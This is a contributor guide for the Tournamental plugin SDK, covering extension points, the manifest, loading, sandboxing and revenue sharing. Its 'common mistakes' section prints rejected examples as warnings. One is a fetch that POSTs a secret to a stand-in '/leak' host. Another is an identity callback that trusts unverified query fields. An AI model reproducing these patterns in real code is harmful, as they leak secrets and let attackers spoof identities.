# 28, Plugin Architecture

> The contributor-facing extension surface. Eight named extension points let third parties drop in a replacement renderer, scorer, ingest source, identity provider, commentary voice, share-card pipeline, odds feed, or affiliate router without forking the core. The SDK lives in [`packages/plugin-sdk`](../packages/plugin-sdk); a working reference plugin lives in [`packages/plugins/example-cel-shaded-renderer`](../packages/plugins/example-cel-shaded-renderer). Contributor revenue routes through the Drips treasury per [doc 19](19-open-source-and-contributor-revenue.md) and [doc 40](40-drips-network-integration.md).

## Why a plugin system exists

Tournamental is open source under Apache 2.0 for a reason: it should attract the people who can build the parts the core team won't be best at. Plugins are the surface area where that bet pays off. Four concrete examples we want to enable:

1. **A better 3D renderer.** The default is React Three Fiber, mid-poly, photoreal-ish, tuned for a mid-range 2022 Android per [doc 04](04-renderer.md). A contributor with WebGPU chops should be able to ship `@tournamental-plugin/webgpu-renderer` with no permission needed from the core team. Cel-shaded, low-poly, isometric top-down, full Unreal-via-Pixel-Streaming, all are valid. The plugin owns the inside of `MatchScene`; the core owns the data pipeline that feeds it.

2. **An alternative scoring formula.** The canonical formula in [doc 16](16-game-modes-and-scoring.md) is built around market-implied probability and time-of-lock. A statistician who wants to score against an ELO baseline, or a club-rating model, or a hand-curated "underdog index", should be able to ship `@tournamental-plugin/elo-scorer` and have users opt-in. Game modes (`docs/16`) can declare which scorer they use.

3. **A new tournament-data ingest source.** Today the producers are `apps/statsbomb-replay` (historic), `apps/mock-producer` (synthetic), and `apps/wc2026-producer` (live). Tomorrow there might be a club's internal tracking feed, a video-CV pipeline ([doc 06](06-video-ingest.md)), a Google Sheet that a gym tournament's owner is updating live, or a Discord bot relaying volunteer-input timestamps. Each one is an `ingestSource` plugin that emits the same spec-conformant stream the renderer reads.

4. **A new identity provider.** The default stack is Supabase + Telegram + DM-OTP across 16 messaging channels ([doc 20](20-identity-humanness-bots.md), [doc 32](32-auth-and-privacy.md)). A crypto-native fork might want Sign-in-with-Ethereum or Farcaster auth; a Discord-native syndicate might want Discord-OAuth only. Each is an `identityProvider` plugin; the core's login picker lists every installed provider.

The pattern: anywhere the core has an internal interface that an external contributor could plausibly improve, expose it as a plugin extension point. Anywhere the boundary would force premature commitments, don't, yet.

## The shape of a plugin in 30 seconds

A plugin is a regular npm package with two extra files:

```
my-plugin/
├── package.json     ← regular npm package metadata
├── plugin.json      ← capability declaration + license + Drips ref
└── src/index.ts     ← exports a default PluginFactory
```

The default export is a function that takes a `PluginContext` (logger, sandboxed fetch, scoped cache) and returns a `Plugin` object. The `Plugin` object names the plugin, names which capabilities it provides, and supplies one implementation object per capability. The core's loader does the wiring. Plugins don't import from the core; they only import from `@tournamental/plugin-sdk` and `@vtorn/spec`.

This is the entire surface. Everything else in this doc is the per-capability contract.

## Extension points

Eight extension points are first-class in v0.1. Each one has a TypeScript interface in [`packages/plugin-sdk/src/index.ts`](../packages/plugin-sdk/src/index.ts), a documented contract here, and a place in the core where it plugs in.

Quick-reference table; deep-dives below.

| Capability           | Replaces                                                                       | Determinism | Idempotency | Default                          |
| -------------------- | ------------------------------------------------------------------------------ | ----------- | ----------- | -------------------------------- |
| `renderer`           | `apps/web/components/MatchScene.tsx` scene-graph                                | no          | on remount  | `@tournamental/renderer-default` |
| `scorer`             | `packages/bracket-engine/src/score.ts`                                          | yes         | yes         | canonical formula (doc 16)        |
| `ingestSource`       | `apps/stream-server/src/sources/*` producers                                    | replays yes | backpressure| `apps/mock-producer` etc.         |
| `identityProvider`   | `apps/auth-sms/src/providers/*` auth flows                                      | callback yes| anti-replay | Supabase + DM-OTP (doc 20)        |
| `commentaryProvider` | `apps/web/components/CommentaryAudio.tsx` text + TTS                            | cache hits  | nullable    | NZ-English ElevenLabs (doc 31)    |
| `shareCardRenderer`  | `packages/social-cards/` canvas pipeline                                        | yes (24h cache)| yes      | default card set                  |
| `oddsSource`         | `apps/odds-ingest/src/sources/*`                                                | no (live)   | flag stale  | Polymarket + Odds API (doc 29)    |
| `affiliateRouter`    | `apps/affiliate-router/src/routers/*`                                           | yes         | audit-logged| upstream router (doc 30)          |

### renderer

Replace `apps/web/components/MatchScene.tsx`'s scene-graph wholesale, or layer effects on top of it.

| Field         | Value                                                                                                                                  |
| ------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| Input         | `(container: HTMLElement, init: MatchInit, opts: RendererMountOpts)`                                                                  |
| Output        | `RendererHandle` with `pushFrame(StateFrame)`, `pushEvent(EventMessage)`, `dispose()`                                                  |
| Determinism   | NOT required (visual; renderers may yield different pixels per mount)                                                                  |
| Idempotency   | REQUIRED on remount (no global side-effects, no DOM writes outside the container)                                                      |
| Plugs into    | `apps/web/components/MatchScene.tsx`, behind a React error boundary that falls back to the default renderer if the plugin throws       |

**Writing your first one.** Start by copying [`packages/plugins/example-cel-shaded-renderer`](../packages/plugins/example-cel-shaded-renderer). It mounts a transparent overlay canvas on top of the core's renderer and runs a cel-shading pass. Rename the package, rewrite the `mount` body to build your scene-graph, push state into your scene from `pushFrame`, and react to `event.goal` / `event.kickoff` etc. inside `pushEvent`. The core's existing R3F scene keeps running in the background unless your plugin replaces the entire container's children. See [doc 04](04-renderer.md) for the perf budgets (60fps on a mid-range 2022 Android, LCP < 2.5s).

### scorer

Replace `packages/bracket-engine/src/score.ts` for one or more game modes.

| Field         | Value                                                                                                                                            |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Input         | `(bracket: ScorerBracket, results: ScorerResults, opts: ScorerOpts)`                                                                            |
| Output        | `PointsBreakdown` with `total` plus `perPrediction` map of `{ points, base, multipliers }`                                                       |
| Determinism   | REQUIRED. Same input MUST always produce the same output. Pure function: no clock reads, no randomness, no network                              |
| Idempotency   | REQUIRED. Calling `score()` repeatedly with the same input is side-effect-free                                                                  |
| Plugs into    | `apps/game/src/scoring.ts`. The core picks a scorer per `gameMode` (game-mode list in [doc 16](16-game-modes-and-scoring.md))                   |

**Writing your first one.** Implement a `ScorerPlugin` with a `score: ScoreFn` field. Declare which `modes` you support. Unit-test against the standard fixture set with `runScorerAgainstFixture()` from `@tournamental/plugin-sdk/test-harness`. The core ships canonical fixtures derived from past tournaments under `packages/bracket-engine/test/`; your scorer's output is comparable line-for-line against the canonical formula. The reviewer agent rejects scorers whose total exceeds 1.5x the canonical for the same input without a written justification. Protects users from accidental "100x points" bugs.

Sample shape:

```ts
import type { ScorerPlugin } from "@tournamental/plugin-sdk";

const eloScorer: ScorerPlugin = {
  label: "ELO-baseline scorer",
  modes: ["bracket", "pre_match"],
  score(bracket, results, opts) {
    let total = 0;
    const perPrediction: PointsBreakdown["perPrediction"] = {};
    for (const pick of bracket.predictions) {
      const actual = results.actual[pick.matchId];
      if (actual == null) continue; // unsettled
      const correct = pick.outcome === actual;
      const base = correct ? 100 : 0;
      const stageMult = STAGE_MULT[pick.stage ?? "group"];
      const points = Math.round(base * stageMult);
      total += points;
      perPrediction[pick.matchId] = {
        points,
        base,
        multipliers: { stage: stageMult },
      };
    }
    return { total, perPrediction };
  },
};
```

### ingestSource

Emit a [`@vtorn/spec`](../packages/spec/src/index.ts)-conformant message stream from any data source.

| Field         | Value                                                                                                                                            |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Input         | `(opts: IngestStartOpts, subscriber: IngestSubscriber)`                                                                                          |
| Output        | `IngestSession` with `dispose()`                                                                                                                 |
| Determinism   | NOT required for live feeds. Replay sources (recorded matches) SHOULD be deterministic given the same `(matchId, timeScale, seed)`               |
| Idempotency   | Backpressure: MUST honour `subscriber.paused`; the stream server pauses you when nobody's listening                                              |
| Plugs into    | `apps/stream-server/src/sources/`. Stream server admin endpoint lists every installed source; operator picks one per match                       |

**Writing your first one.** Implement `start()` to call `subscriber.push(msg)` at the right cadence (10–30 Hz for state frames, irregular for events). Use [`packages/spec/src/index.ts`](../packages/spec/src/index.ts) for the message shapes; do not redefine them. The standard fixture set has a 30-second AR-FR clip you can target for golden-file regression tests (`runIngestAgainstFixture()` drains your source into an array for comparison). See [`apps/mock-producer`](../apps/mock-producer/) for a complete reference producer.

Sample shape:

```ts
import type { IngestPlugin } from "@tournamental/plugin-sdk";

const csvReplay: IngestPlugin = {
  label: "CSV replay",
  id: "csv-replay",
  async listAvailableMatches() {
    return [{ matchId: "demo-match", label: "Demo CSV", sport: "soccer" }];
  },
  async start(opts, subscriber) {
    const rows = await loadCsv(opts.matchId);
    subscriber.push(buildMatchInit(rows));
    const timer = setInterval(() => {
      if (subscriber.paused) return;
      const frame = nextStateFrame(rows);
      if (!frame) { subscriber.end(); clearInterval(timer); return; }
      subscriber.push(frame);
    }, 100 / (opts.timeScale ?? 1));
    return { async dispose() { clearInterval(timer); } };
  },
};
```

### identityProvider

Alternative to Supabase / Telegram / DM-OTP.

| Field         | Value                                                                                                                                            |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Input         | `buildAuthRedirect(opts)` returns redirect URL; `verifyCallback(callback)` returns `Identity`                                                    |
| Output        | `Identity` with `providerId`, `providerUserId`, plus optional `displayName`, `avatarUrl`, `email`, `phoneE164`, `walletAddress`                  |
| Determinism   | `verifyCallback` MUST be deterministic for the same callback + state                                                                             |
| Idempotency   | Replay attack defence: the plugin MUST reject a callback whose state doesn't match `expectedState`                                               |
| Plugs into    | `apps/auth-sms/src/providers/` and `apps/web/components/auth/`                                                                                   |

**Writing your first one.** The hard part is signature verification: SIWE plugins verify an EIP-191 signed message, Farcaster plugins verify a Farcaster auth-kit response, Discord-OAuth plugins verify the OAuth2 code-for-token exchange. Whatever the provider, the plugin owns the crypto. The core ONLY accepts the validated `Identity` over the SDK boundary, never an opaque token. The reviewer agent reads the verification path on every PR. See [doc 20](20-identity-humanness-bots.md) for how `Identity` slots into the rest of the auth flow.

Sample shape (Sign-in-with-Ethereum, abridged):

```ts
import type { IdentityPlugin } from "@tournamental/plugin-sdk";

const siwe: IdentityPlugin = {
  label: "Sign-in with Ethereum",
  id: "siwe",
  async buildAuthRedirect({ state, redirectUri }) {
    return `/auth/siwe/start?state=${state}&redirect=${encodeURIComponent(redirectUri)}`;
  },
  async verifyCallback({ query, expectedState }) {
    if (query.state !== expectedState) throw new PluginError("BAD_STATE", "state mismatch");
    const ok = await verifyEip191(query.message, query.signature);
    if (!ok) throw new PluginError("BAD_SIGNATURE", "signature failed verification");
    return {
      providerId: "siwe",
      providerUserId: recoverAddress(query.signature, query.message),
      walletAddress: recoverAddress(query.signature, query.message),
    };
  },
};
```

### commentaryProvider

Alternative TTS / writer / language pack.

| Field         | Value                                                                                                                                            |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Input         | `scriptFor(event, context)` returns text; `synthesize(text, voice)` returns audio URL                                                            |
| Output        | `{ url: string; durationMs: number }`                                                                                                            |
| Determinism   | Text generation SHOULD be deterministic for cache hits. TTS NOT required (provider varies)                                                       |
| Idempotency   | Plugins MAY return `null` from `scriptFor` to skip events they don't care about                                                                  |
| Plugs into    | `apps/web/components/CommentaryAudio.tsx`; see [doc 31](31-live-commentary-overlay.md)                                                           |

**Writing your first one.** Locale-only plugins are easiest: take the English script and translate it. Voice-only plugins (different ElevenLabs voice IDs, alternative TTS providers like Play.ht or OpenAI's voice) wrap the synthesize call. Personality plugins (tabloid, kid-friendly, statistician) own both `scriptFor` and `synthesize`. The locale tag is BCP-47 (`en-NZ`, `es-AR`, `ja-JP`).

### shareCardRenderer

Alternative OG card pipeline.

| Field         | Value                                                                                                                                            |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Input         | `render(kind, payload)` where kind is one of `match_summary` / `bracket_reveal` / `leaderboard_rank` / `syndicate_result` / `prediction_iq` / `vstamp_receipt` |
| Output        | `Uint8Array` of PNG bytes                                                                                                                        |
| Determinism   | SHOULD be deterministic (cards are CDN-cached 24h; non-deterministic plugins cause "card changed after share" bugs)                              |
| Idempotency   | REQUIRED. Same input → same PNG bytes                                                                                                            |
| Plugs into    | `apps/web/app/api/og/route.ts` and `apps/clip-pipeline/src/cards.ts`. Default lives in [`packages/social-cards`](../packages/social-cards)        |

**Writing your first one.** Match the default's canvas pipeline: a 1200x630 PNG with deterministic fonts and accent colours. Pick one card kind to start (`match_summary` is the most-viewed). The fonts live alongside the default in `packages/social-cards/fonts/`; plugin authors can vendor their own. See [doc 14](14-clip-generation-and-social.md) for how share cards interact with the clip pipeline.

### oddsSource

Alternative odds ingest beyond Polymarket / The Odds API.

| Field         | Value                                                                                                                                            |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Input         | `fetchProbabilities(matchId)`                                                                                                                    |
| Output        | `OddsSample` with `outcomes` (sum 1.0 ± 0.02 for vig), `fetchedAtMs`, `stalenessSeconds`                                                         |
| Determinism   | NOT required (live feed)                                                                                                                         |
| Idempotency   | MUST flag stale data via `stalenessSeconds`; core rejects probabilities that don't sum to ~1.0                                                  |
| Plugs into    | `apps/odds-ingest/src/sources/`. Multiple sources run in parallel; the core blends them per [doc 12](12-odds-and-predictions.md)'s weights      |

**Writing your first one.** Most odds plugins are a thin HTTP wrapper: fetch a JSON endpoint, map fields, return. The `permissions.network` allow-list in your `plugin.json` lists the origins you'll hit; the sandboxed `fetch` in `PluginContext` rejects everything else. See [doc 29](29-polymarket-odds-integration.md) for the reference integration.

### affiliateRouter

Alternative routing logic + revenue split.

| Field         | Value                                                                                                                                            |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Input         | `resolveClick({ userId, partnerId, geoIso2, campaignId?, bracketId? })`                                                                          |
| Output        | `AffiliateClickResult` with `url`, `clickId`, optional `dripsListRef`                                                                            |
| Determinism   | REQUIRED. Same `(userId, partnerId, geoIso2)` MUST resolve to the same destination during a session                                              |
| Idempotency   | Routing is audit-logged per [doc 30](30-gamification-and-affiliate-spine.md); the audit log is the source of truth                              |
| Plugs into    | `apps/affiliate-router/src/routers/`. Plugins constrained by Drips treasury setup per [doc 19](19-open-source-and-contributor-revenue.md)        |

**Writing your first one.** Affiliate routers are the most regulated extension point. Read [doc 18](18-monetization.md) and [doc 19](19-open-source-and-contributor-revenue.md) first. Any plugin that earns revenue from clicks routed through Tournamental MUST commit the revenue stream back into the upstream Drips list, or be rejected by the reviewer agent. Forks that want their own revshare can fork the core and set up their own treasury.

## Plugin manifest

Every plugin ships a `plugin.json` alongside its `package.json`. The loader reads `plugin.json` first, validates against the Zod schema in [`packages/plugin-sdk/src/manifest.ts`](../packages/plugin-sdk/src/manifest.ts), then dynamically imports the package and calls its default export.

Schema fields:

| Field            | Required | Description                                                                                                                                                |
| ---------------- | -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `name`           | yes      | npm package name. External plugins MUST live under `@tournamental-plugin/` to be auto-discovered                                                          |
| `version`        | yes      | SemVer                                                                                                                                                     |
| `description`    | yes      | One-line description for the plugin picker UI (10–280 chars)                                                                                              |
| `sdkRange`       | yes      | Semver-pinned peer dependency on the SDK. Loader rejects mismatches. Typical: `"^0.1.0"`                                                                  |
| `provides`       | yes      | Array of capabilities. At least one. Values: `renderer`, `scorer`, `ingestSource`, `identityProvider`, `commentaryProvider`, `shareCardRenderer`, `oddsSource`, `affiliateRouter` |
| `license`        | yes      | One of `Apache-2.0`, `MIT`, `BSD-2-Clause`, `BSD-3-Clause`. Everything else is rejected                                                                   |
| `dripsListRef`   | no       | `drips:<chain>:<account-id>`. Required for in-monorepo plugins                                                                                            |
| `author`         | no       | `{ name, email?, url?, wallet? }`. `wallet` is the Drips recipient address                                                                                |
| `repository`     | no       | URL of the plugin's source repo                                                                                                                            |
| `permissions`    | no       | Plugins NOT in `packages/plugins/*` MUST declare this. Has `network: { allowedOrigins: [] }` and `dom: "scoped" \| "unrestricted"`                       |
| `main`           | no       | Default-export entry. Defaults: `dist/index.js` (npm) or `index.ts` (local-dir)                                                                          |
| `coreRange`      | no       | Optional semver range for the core itself                                                                                                                  |
| `tags`           | no       | Free-form tags for the plugin marketplace UI                                                                                                              |

Strict mode is on: unknown top-level fields are rejected. This forces plugin authors to track the schema as it evolves; we'd rather break loudly than silently ignore a typo'd field.

License rejection is deliberate. AGPL and proprietary plugins are out because mixing them with the Apache 2.0 core puts downstream operators (white-label broadcasters, sponsors running branded leagues) into a compliance trap. If you need a different license, fork the core. Forks aren't eligible for the upstream Drips treasury.

## Discovery and loading

The core picks up plugins from two places at app boot.

### Path A: npm-installed under `@tournamental-plugin/*`

The plugin loader scans `node_modules` for packages matching the `@tournamental-plugin/*` scope glob, reads each one's `plugin.json`, validates against the manifest schema, and dynamically imports the default export. This is the production path: plugins ship to npm, users install via `pnpm add @tournamental-plugin/elo-scorer`, plugins are picked up on the next deploy.

```bash
# How the user installs an external plugin
cd apps/web
pnpm add @tournamental-plugin/elo-scorer
# Next deploy auto-discovers it
```

### Path B: local `plugins/` directory

For development and the AR-FR demo, plugins can live in a top-level `plugins/` directory:

```
plugins/
├── my-renderer/
│   ├── package.json
│   ├── plugin.json
│   └── src/index.ts
└── my-scorer/
    ├── package.json
    ├── plugin.json
    └── src/index.ts
```

The loader picks up every subdirectory of `plugins/` whose `plugin.json` parses. Local-dir plugins are NOT auto-published to npm; they're for the contributor's own dev loop. Promote to npm when ready.

### Loading sequence

```
1. App boot.
2. Loader scans plugins/ + node_modules.
3. For each candidate:
   a. Parse plugin.json (reject on schema fail).
   b. Check sdkRange against installed SDK version (skip on mismatch).
   c. Check license against allow-list (skip + warn on mismatch).
   d. Dynamic import the entry file.
   e. Call the default export with PluginContext.
   f. Register the returned Plugin in the per-capability registry.
4. App ready.
```

Loading failures are per-plugin. A failed `import()` or factory call logs an error and continues; the rest of the app boots. The plugin picker UI shows failed plugins with a "load failed" badge so users can diagnose.

### Selection

For multi-instance capabilities (`scorer` per mode, `oddsSource` blended, `affiliateRouter` by geo) the core picks at request time. For single-instance capabilities (`renderer`, `commentaryProvider` per session) the core picks via:

1. URL flag, e.g. `?renderer=example-cel-shaded-renderer`
2. User settings (saved per-user)
3. Per-match default (operator can pin)
4. Built-in default (`@tournamental/renderer-default`, etc.)

If the selected plugin throws on mount/start, the core falls back through the chain to the built-in default.

## Sandboxing and security

Plugins run in the same process as the core. There is no iframe, web worker, or VM boundary in v1. The security model is "trust on review": the reviewer agent reads every plugin PR end-to-end before merge, and auto-merge is OFF for any PR that lands a plugin (including in-monorepo plugins).

What's protected anyway:

- **Network.** Plugins requesting `permissions.network` declare an explicit allow-list of URL prefixes. The `PluginContext.fetch` rejects everything else. The reviewer agent verifies the allow-list against the plugin's stated purpose: an odds plugin can talk to its odds API; it cannot talk to a Discord webhook.
- **DOM.** Renderer plugins default to a `scoped` permission that limits them to writing inside the container the core gives them. Plugins requesting `dom: "unrestricted"` (WebGL, WebGPU) get a warning logged on every mount.
- **Secrets.** The core does NOT pass DB credentials, API keys, or session tokens through `PluginContext`. Plugins that need a secret (a TTS API key, an OAuth client secret) read it from their own env-var namespace (`PLUGIN_<NAME>_*`) which the operator sets in the deploy config.

In v2 we'll explore moving renderer + commentary plugins behind a Web Worker boundary (the renderer plugin gets a `MessageChannel` to the main thread for DOM ops). Scorer plugins are already a candidate for a WASM sandbox since they're pure functions. Both deferred until external contributor traffic justifies the engineering load.

## Revenue split

Plugins shipped in `packages/plugins/*` or under the `@tournamental-plugin/*` npm scope are added to the upstream Drips list per [doc 19](19-open-source-and-contributor-revenue.md). The mechanics:

1. Plugin author opens a PR adding their plugin to `packages/plugins/*`. PR includes `plugin.json` with `dripsListRef` and `author.wallet`.
2. Reviewer agent checks license, manifest, code, and tests. If green, requests a second review from a maintainer.
3. On merge, the plugin's author wallet is added to the Drips list with a default 1.0% allocation, capped by the per-quarter contribution scoring (doc 19's Mechanism A).
4. Each quarter, the contributor-impact assessment adjusts splits based on plugin usage (telemetry counts of `RendererPlugin.mount`, `ScorerPlugin.score`, etc.).

External plugins (their own GitHub repo, published to `@tournamental-plugin/` namespace but not in the monorepo) negotiate separately. The maintainers' policy is "yes by default if the license is compatible"; the negotiation is mainly about allocation size and quarterly review.

Plugins that generate direct revenue (`affiliateRouter`) MUST route a share back into the Drips treasury or be rejected at PR review. This protects upstream contributors from being out-monetised by a fork-via-plugin.

## Versioning

The SDK package follows SemVer.

| Bump  | Meaning                                                                                                                                                |
| ----- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Patch | Bug fixes in helpers, docstring updates, internal refactors. No interface changes                                                                       |
| Minor | New extension point, new optional fields on an existing interface, new helper in the test harness. Backwards-compatible: old plugins continue to load   |
| Major | Breaking change to any plugin interface. Removes a field, renames a method, narrows a type. Plugin authors must update their plugin                     |

**Major bumps are slow.** The process:

1. RFC opened as a GitHub Discussion under `.github/DISCUSSIONS/sdk-vN/`. Includes motivation, migration guide, and a sample-rewrite for each affected built-in plugin.
2. 60 days of notice. RFC is announced on the [Tournamental Discussions](https://github.com/tournamental/tournamental/discussions) page, in the contributors' Telegram channel, and pinned on the SDK's npm page.
3. Major release ships. Old SDK version is deprecated but still loaded by the core for one minor cycle (e.g. SDK 1.x is loaded by core 1.5–1.7 alongside SDK 2.x).
4. Old SDK version is removed in the core release after the deprecation cycle. Plugins still pinned to the old SDK stop loading with a clear error pointing at the migration RFC.

Patch / minor bumps ship with the normal Tournamental release cadence.

## Worked example: building `@tournamental-plugin/cel-shaded-renderer`

Walking through every step a hypothetical contributor would take. The output is the same package that already lives at [`packages/plugins/example-cel-shaded-renderer`](../packages/plugins/example-cel-shaded-renderer); this is the "do as I do" version.

### Step 1: scaffold

```bash
pnpm create @tournamental/plugin renderer my-cel-shaded
# Creates plugins/my-cel-shaded/ with package.json, plugin.json,
# src/index.ts wired up against the SDK.
```

(The `pnpm create` command is a stub today; in v0.2 it lands as a working scaffolder. For now, copy `packages/plugins/example-cel-shaded-renderer` and rename.)

### Step 2: `plugin.json`

```json
{
  "name": "@tournamental-plugin/cel-shaded-renderer",
  "version": "0.1.0",
  "description": "A cel-shaded toon renderer for match playback.",
  "sdkRange": "^0.1.0",
  "provides": ["renderer"],
  "license": "Apache-2.0",
  "author": {
    "name": "Ada Lovelace",
    "wallet": "0x1234567890123456789012345678901234567890"
  },
  "permissions": {
    "dom": "unrestricted"
  }
}
```

Why each field:

- `sdkRange: "^0.1.0"` pins to the v0.1 SDK; loader rejects on v1.0 until the plugin is updated.
- `provides: ["renderer"]` is what the core's plugin registry indexes.
- `license: "Apache-2.0"` keeps the plugin in the upstream-Drips-eligible pool.
- `author.wallet` is the Drips recipient address. Optional, but required to receive revenue share.
- `permissions.dom: "unrestricted"` because WebGL writes to a `<canvas>` and may add post-FX globally.

### Step 3: factory + renderer

```ts
// src/index.ts
import type {
  Plugin,
  PluginContext,
  PluginFactory,
  RendererPlugin,
} from "@tournamental/plugin-sdk";

const celShaded: RendererPlugin = {
  label: "Cel-shaded",
  supports: { sport: ["soccer"], xr: false, headless: true },
  mount(container, init, opts) {
    // ... your scene-graph here ...
    return {
      pushFrame(frame) { /* feed into your scene */ },
      pushEvent(event) { /* react to event.goal etc. */ },
      dispose() { /* free GPU resources */ },
    };
  },
};

const factory: PluginFactory = (ctx: PluginContext) => ({
  name: "@tournamental-plugin/cel-shaded-renderer",
  version: "0.1.0",
  provides: ["renderer"],
  renderer: celShaded,
});

export default factory;
```

The factory is cheap: no GPU work, no network calls. Heavy initialisation happens inside `mount` so a failing plugin can't slow app boot.

### Step 4: scene-graph (the actual rendering work)

This is where the plugin author's expertise matters. The example uses a transparent overlay canvas; a serious renderer plugin would mount a full Three.js scene with toon-shaded `MeshToonMaterial` players, outline pass, and a stair-stepped luminance ramp. See [`packages/plugins/example-cel-shaded-renderer/src/index.ts`](../packages/plugins/example-cel-shaded-renderer/src/index.ts) for the reference shape and [doc 04](04-renderer.md) for the perf budgets your scene must hit.

### Step 5: unit tests

```ts
// test/render.test.ts
import { renderFrameToPng, makeFixtureMatchInit, makeFixtureStateFrame } from "@tournamental/plugin-sdk/test-harness";
import { celShaded } from "../src/index.js";

it("produces a non-empty PNG for the standard fixture", async () => {
  const bytes = await renderFrameToPng(celShaded, makeFixtureMatchInit(), makeFixtureStateFrame());
  expect(bytes.length).toBeGreaterThan(0);
});
```

In a browser-mode Vitest setup this exercises the real `mount`. In a Node CI environment without a DOM the harness returns a sentinel PNG; the test still verifies the plugin didn't throw on import.

### Step 6: try it in dev

```bash
# Drop the plugin into the local plugins/ dir
ln -s ../packages/plugins/my-cel-shaded plugins/my-cel-shaded
# Boot the dev stack
pnpm dev
# Open the renderer with your plugin selected
open "http://localhost:3300/match/synthetic?renderer=my-cel-shaded"
```

The URL flag overrides any saved user setting; you A/B the plugin against the default by toggling the flag.

### Step 7: publish

```bash
cd packages/plugins/my-cel-shaded
pnpm publish --access public
# The npm registry now serves @tournamental-plugin/cel-shaded-renderer.
# The core's plugin loader auto-discovers it on the next deploy.
```

### Step 8: get added to the Drips list

Open a PR to the monorepo adding your plugin under `packages/plugins/my-cel-shaded` (mirror of the npm package; the monorepo copy is what users in the official deployment install). Include `dripsListRef` in `plugin.json` matching the upstream treasury. Reviewer agent + maintainers review; on merge, your wallet is added to the Drips list per [doc 40](40-drips-network-integration.md).

## Common mistakes (and how the reviewer agent catches them)

The reviewer agent reads every plugin PR. These are the patterns that get a request-changes:

### License header missing

Every source file in a plugin needs the Apache-2.0 SPDX line at the top:

```
// SPDX-License-Identifier: Apache-2.0
```

(or `MIT` / `BSD-2-Clause` / `BSD-3-Clause` if the plugin chose that license). The reviewer agent greps for it; missing the header on any `.ts` file is an instant request-changes. Reason: provenance. When a downstream operator looks at a 5000-line plugin three years from now, the per-file header tells them what they can copy out of it without dragging the rest of the package's license.

### Scorer with hidden randomness

```ts
// REJECTED: uses Math.random()
score(bracket, results) {
  const fuzz = Math.random() * 0.1;
  return { total: bracket.predictions.length * (1 + fuzz), perPrediction: {} };
}
```

Scorers MUST be deterministic. Any reproducibility break (same input → different output across calls) breaks the leaderboard's auditability. The reviewer agent runs the scorer twice against the same input and compares; mismatches are an instant reject.

### Renderer that writes outside its container

```ts
// REJECTED: writes to document.body
mount(container, init) {
  const overlay = document.createElement("div");
  document.body.appendChild(overlay); // <-- not container
  ...
}
```

Renderers MUST confine DOM writes to the container the core gives them. The next renderer mount can't clean up after a plugin that scattered elements across the page. Linted via the `no-unsanctioned-dom` ESLint rule shipped by the SDK in v0.2.

### Network call outside the allow-list

```ts
// REJECTED: fetch outside permissions.network.allowedOrigins
fetch("https://api.unrelated.example/leak", { method: "POST", body: secret });
```

The sandboxed `PluginContext.fetch` rejects this at runtime; the reviewer agent ALSO rejects the PR because `PluginContext.fetch` being wrapped is the only thing standing between a plugin and unrestricted outbound traffic. Use `ctx.fetch`, not the global `fetch`.

### License field set to `UNLICENSED` or `proprietary`

The manifest schema rejects this at load time, but plugin authors occasionally try to mix proprietary code with an Apache-2.0 manifest. The reviewer agent verifies the source files' SPDX headers match the manifest's `license` field. Mismatch is an instant reject.

### Manifest fields drift from package.json

`name` and `version` in `plugin.json` MUST match the corresponding fields in `package.json`. Drift breaks the loader's resolution (it imports by `package.json` name, validates by `plugin.json` name). The SDK ships a `validate-plugin` CLI in v0.2 that catches this; until then, the reviewer agent does it by eye.

### Forgetting `subscriber.paused` in an ingest source

Ingest plugins that push frames during periods of zero downstream subscribers waste CPU and (for live feeds) waste API budget. The reviewer agent rejects ingest plugins whose `start()` body doesn't reference `subscriber.paused`. The pattern:

```ts
const tick = () => {
  if (subscriber.paused) { setTimeout(tick, 100); return; }
  subscriber.push(nextFrame());
  setTimeout(tick, FRAME_INTERVAL_MS);
};
```

### Identity provider that trusts callback fields without verification

```ts
// REJECTED: accepts displayName from query string without verification
async verifyCallback({ query }) {
  return {
    providerId: "discord",
    providerUserId: query.user_id, // unverified
    displayName: query.username,    // unverified
  };
}
```

Every field returned in `Identity` MUST be verified against the provider's signed response. Identity plugins are the highest-trust extension point; the reviewer agent walks every line of `verifyCallback` and asks "what makes this field trustworthy?"

## FAQ for plugin authors

**Q: Can my plugin provide more than one capability?** Yes. Set `provides: ["renderer", "shareCardRenderer"]` in `plugin.json` and supply both `renderer` and `shareCardRenderer` fields on the returned `Plugin` object. The core registers your plugin in each capability's registry.

**Q: How do I read a secret (e.g. ElevenLabs API key)?** Operator-side env vars under a `PLUGIN_<UPPER_SNAKE_NAME>_*` prefix. The deploy config sets them; the plugin reads them via `process.env`. Plugins MUST NOT read env vars outside their own prefix; the reviewer agent grep-checks this on PR.

**Q: How do I share state between plugin invocations?** Use `PluginContext.cache`. It's per-plugin-namespaced (your `set("foo", v)` doesn't collide with another plugin's `foo`), backed by Redis in prod and an in-memory map in dev. For data heavier than ~1MB or longer-than-24h retention, stand up your own DB; the cache is for hot-path memoisation.

**Q: Can my plugin call another plugin?** Not directly. The core mediates: if you need a different scoring formula inside your renderer, request the canonical scorer via the core's `useScoring()` hook (renderer-side) or `getScorer()` call (server-side). The reasoning is that plugin-to-plugin coupling silently widens the trust surface; routing through the core keeps it auditable.

**Q: How do I localise my plugin's UI strings?** Plugins that ship UI fragments (renderer overlays, commentary labels, error messages) provide an `i18n` object on the `Plugin` shape (added in SDK v0.2). Until then, English-only is acceptable; the core wraps unrecognised locales with its own UI.

**Q: My plugin needs a peer-dep version conflict resolved.** Pin the version range in your own `package.json`. The core uses pnpm's workspace resolution; conflicts surface at `pnpm install`. If your plugin's dep version is incompatible with what the core ships, open a discussion thread on the core repo first.

**Q: How does my plugin handle a stream interruption?** Renderer plugins should expect `pushFrame` to drop frames (network blips) and interpolate across gaps. Ingest plugins should reconnect on transient failures and signal `subscriber.end()` on permanent ones. The core's stream-server takes care of subscriber reconnection.

